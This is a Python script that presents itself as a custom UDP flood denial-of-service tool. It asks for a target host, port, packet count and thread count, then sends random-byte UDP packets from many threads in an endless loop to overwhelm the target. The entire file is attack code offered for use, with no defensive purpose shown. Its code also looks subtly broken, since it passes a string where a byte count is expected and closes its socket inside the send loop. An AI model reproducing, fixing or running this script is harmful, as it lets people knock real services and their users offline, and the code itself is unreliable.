import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print(" Flood Dos Custom by ?\n")
print(" Method >> UDP \n")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
length_string = "03456"
def run():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			i = random.choice(length_string)
			addr = (str(ip),int(port))
			data2 = random._urandom(i)
			s2.sendto(data2,addr)
			time.sleep(.9)
			s2.close()
			for x in range(times):
				s.sendto(data,addr)
				s.close()
			print("UDP Sent")
		except:
			s.close()
			print("[!] Error!!!")

for y in range(threads):
		th = threading.Thread(target = run)
		th.start()